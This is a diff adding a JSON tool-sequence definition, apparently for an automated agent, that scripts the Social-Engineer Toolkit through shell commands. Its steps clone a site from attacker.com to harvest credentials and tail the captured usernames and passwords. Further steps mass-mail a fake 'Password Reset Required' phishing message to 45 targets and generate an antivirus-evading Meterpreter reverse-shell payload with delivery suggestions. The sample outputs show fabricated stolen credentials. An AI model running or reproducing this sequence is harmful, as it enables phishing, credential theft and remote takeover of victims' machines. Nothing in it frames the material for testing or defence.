@@ -1,0 +1,30 @@
+{
+  "name": "set_social_engineering_toolkit",
+  "description": "Social Engineering Toolkit (SET) for credential harvesting and attack vectors",
+  "pattern": "set.*toolkit|social.*engineer|credential.*harvest|set.*attack",
+  "parameters": ["attack_type"],
+  "sequence": [
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "setoolkit", "args": []},
+      "expected_output": {"type": "string", "example": "         ______________________________________________________\n        |                                                      |\n        |          Social-Engineer Toolkit (SET)               |\n        |            Version: 8.0.3 - Codename: 'Maverick'    |\n        |                                                      |\n        |______________________________________________________|\n\n Select from the menu:\n\n   1) Social-Engineering Attacks\n   2) Penetration Testing (Fast-Track)\n   3) Third Party Modules\n   4) Update the Social-Engineer Toolkit\n   5) Update SET configuration\n   6) Help, Credits, and About\n\n  99) Exit the Social-Engineer Toolkit\n\nset>"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo '1\\n2\\n3\\n2\\nhttp://attacker.com\\n' | setoolkit"]},
+      "expected_output": {"type": "string", "example": "set> 1\n\n 1) Spear-Phishing Attack Vectors\n 2) Website Attack Vectors\n 3) Infectious Media Generator\n 4) Create a Payload and Listener\n 5) Mass Mailer Attack\n\nset:webattack> 2\n\n 1) Java Applet Attack Method\n 2) Metasploit Browser Exploit Method\n 3) Credential Harvester Attack Method\n 4) Tabnabbing Attack Method\n 5) Web Jacking Attack Method\n\nset:webattack> 3\n\n 1) Web Templates\n 2) Site Cloner\n 3) Custom Import\n\nset:webattack:harvester> 2\n\nEnter the URL to clone: http://attacker.com\n\n[*] Cloning the website: http://attacker.com\n[*] This could take a little bit...\n[*] Injecting credential harvester into cloned site...\n[*] Starting Apache web server on port 80...\n[*] Credential harvester is now active on http://your_ip\n\n[*] Credentials will be stored in: /root/.set/reports/\n[*] Waiting for connections..."}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "tail -f /var/www/html/harvester/credentials.txt"]},
+      "expected_output": {"type": "string", "example": "[*] Credential Harvester - Captured Credentials\n[*] Time: 2024-01-15 15:45:22\n\n[+] Username/Email: john.doe@company.com\n[+] Password: P@ssw0rd123\n[+] IP Address: 192.168.1.105\n[+] User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n\n---\n\n[*] Time: 2024-01-15 15:47:18\n\n[+] Username/Email: alice.smith@company.com\n[+] Password: Welcome2024!\n[+] IP Address: 192.168.1.112\n[+] User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\n\n---\n\nTotal credentials harvested: 12\nUnique users compromised: 12"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo '1\\n1\\n\\nspear@phish.com\\nCompany IT\\nPassword Reset Required\\ntargets.txt\\nPassword expiring in 24 hours. Click here to reset: http://phish.company.com\\n' | setoolkit"]},
+      "expected_output": {"type": "string", "example": "set> 1\n\nSelect attack vector:\n 1) Spear-Phishing Attack Vectors\n\nset:phishing> 1\n\n 1) Perform a Mass Email Attack\n 2) Create a FileFormat Payload\n 3) Create a Social-Engineering Template\n\nset:phishing:massemail>\n\nFrom address: spear@phish.com\nFrom name: Company IT\nSubject: Password Reset Required\nEmail list: targets.txt\nMessage: Password expiring in 24 hours...\n\n[*] Sending emails to 45 targets...\n[*] Email 1/45 sent to john.doe@company.com\n[*] Email 2/45 sent to jane.smith@company.com\n[*] Email 3/45 sent to mike.johnson@company.com\n...\n[*] Email 45/45 sent to sarah.williams@company.com\n\n[+] Mass email attack completed\n[+] Total emails sent: 45\n[+] Failed deliveries: 2\n[+] Success rate: 95.6%"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo '1\\n4\\n\\n2\\npayload.exe\\n192.168.1.100\\n4444\\n' | setoolkit"]},
+      "expected_output": {"type": "string", "example": "set> 1\nset:payload> 4\n\n 1) Windows Reverse TCP Shell\n 2) Windows Meterpreter Reverse TCP\n 3) Windows Reverse HTTPS Meterpreter\n\nset:payload:windows> 2\n\nPayload name: payload.exe\nLHOST (attacker IP): 192.168.1.100\nLPORT: 4444\n\n[*] Generating Windows Meterpreter payload...\n[*] Encoding payload to evade AV...\n[*] Payload generated: /root/.set/payload.exe\n[*] File size: 73802 bytes\n[*] Starting multi/handler listener...\n\n[*] Payload ready for delivery via:\n  - Email attachment\n  - USB drop\n  - Fake software update\n  - Watering hole attack\n\n[*] Listener active on 192.168.1.100:4444\n[*] Waiting for connections..."}
+    }
+  ],
+  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "created_by": "neural_mesh_v5.2_generator"
+}
